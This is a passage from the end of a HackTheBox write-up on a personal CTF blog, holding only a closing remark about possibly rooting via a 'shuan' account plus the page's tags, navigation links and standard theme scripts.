</code></pre><p>I wonder if there was a way to root via the shuan account.</p><p>:</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/dyplesher/><span class=title>« Prev</span><br><span>Dyplesher </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/cache/><span class=title>Next »</span><br><span>Cache</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>